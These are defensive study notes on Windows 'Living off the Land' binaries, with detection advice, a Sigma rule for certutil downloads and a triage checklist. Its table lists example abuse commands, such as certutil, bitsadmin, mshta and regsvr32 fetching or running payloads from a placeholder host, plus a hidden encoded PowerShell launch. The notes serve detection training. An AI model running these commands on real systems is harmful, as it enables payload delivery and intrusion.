# Living Off the Land Binaries (LOLBins) and How to Detect Them

> Attackers do not always bring their own tools. They often abuse **legitimate, signed Windows binaries** that are already on the system. This is called *Living off the Land*.

---

## Why Attackers Use LOLBins

- They are **signed by Microsoft**, so they are trusted by default.
- They are **already installed**, so nothing new has to be dropped.
- They blend in with normal admin activity.
- Basic antivirus rarely blocks them.

The **LOLBAS project** (lolbas-project.github.io) documents these binaries and how they can be abused.

---

## Common LOLBins

| Binary | Abuse | Example | MITRE ATT&CK |
|--------|-------|---------|--------------|
| `certutil.exe` | Download files, decode Base64 | `certutil -urlcache -split -f http://x/p.exe p.exe` | T1105, T1140 |
| `bitsadmin.exe` | Download files in the background | `bitsadmin /transfer job /download /priority high http://x/p.exe C:\p.exe` | T1197 |
| `mshta.exe` | Run HTA / script from a URL | `mshta http://x/payload.hta` | T1218.005 |
| `regsvr32.exe` | Run a remote scriptlet ("Squiblydoo") | `regsvr32 /s /n /u /i:http://x/file.sct scrobj.dll` | T1218.010 |
| `rundll32.exe` | Run DLL exports or script | `rundll32.exe payload.dll,EntryPoint` | T1218.011 |
| `wmic.exe` | Execute processes locally or remotely | `wmic process call create "cmd.exe /c ..."` | T1047 |
| `msbuild.exe` | Compile and run inline C# | `msbuild.exe payload.xml` | T1127.001 |
| `installutil.exe` | Run code in a .NET assembly | `installutil.exe /logfile= /LogToConsole=false /U payload.dll` | T1218.004 |
| `powershell.exe` | Encoded / in-memory payloads | `powershell -nop -w hidden -enc <base64>` | T1059.001 |

---

## Detection Strategy

Blocking these binaries usually breaks normal operations, so the focus is on **how** they are used.

### 1. Suspicious command-line arguments
Look at Sysmon Event ID 1 or Security Event ID 4688 (with command-line auditing):
- `certutil` with `-urlcache` or `-decode`
- `regsvr32` with `/i:http`
- `mshta` with `http`, `javascript:` or `vbscript:`
- `powershell` with `-enc`, `-w hidden`, `DownloadString`, `IEX`

### 2. Unusual parent processes
- `winword.exe` → `mshta.exe`
- `excel.exe` → `regsvr32.exe`
- `wmiprvse.exe` → `powershell.exe` (remote WMI execution)

### 3. Network connections
Sysmon Event ID 3 from `certutil.exe`, `mshta.exe`, `regsvr32.exe` or `rundll32.exe` to external IPs is rarely legitimate.

### 4. Unusual file locations
LOLBins running from paths other than `C:\Windows\System32` or `SysWOW64` — attackers sometimes copy and rename them.

---

## Example Sigma Rule — Certutil Download

```yaml
title: Certutil Used to Download a File
status: experimental
description: Detects certutil.exe being used with URL cache arguments to download files
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    Image|endswith: '\certutil.exe'
  selection_cli:
    CommandLine|contains:
      - 'urlcache'
      - 'verifyctl'
  condition: selection_img and selection_cli
falsepositives:
  - Rare administrative use
level: high
tags:
  - attack.command_and_control
  - attack.t1105
```

---

## Triage Checklist

When a LOLBin alert fires:

1. **What** was the full command line?
2. **Who** ran it — which user account?
3. **What started it** — parent process?
4. **Did it connect out** — destination IP / domain?
5. **Did it drop a file** — Sysmon Event ID 11?
6. **What happened next** — child processes?

---

## Key Takeaways

- LOLBins are legitimate tools used in illegitimate ways.
- Detection relies on **command line + parent process + network activity**, not the binary name alone.
- Keep the LOLBAS project bookmarked during investigations.

> Notes written while working through the TryHackMe SOC Level 1 path.
